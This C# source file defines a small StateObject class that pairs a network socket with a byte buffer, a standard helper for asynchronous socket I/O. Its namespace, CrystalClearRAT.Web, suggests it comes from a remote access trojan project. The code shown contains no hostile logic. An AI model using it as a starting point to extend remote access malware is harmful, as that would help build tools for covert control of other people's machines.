using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace CrystalClearRAT.Web
{
    class StateObject
    {
        public Socket Socket { get; private set; }
        public byte[] Buffer { get; private set; }
        public StateObject(Socket socket, byte[] buffer)
        {
            Socket = socket;
            Buffer = buffer;
        }

    }
}
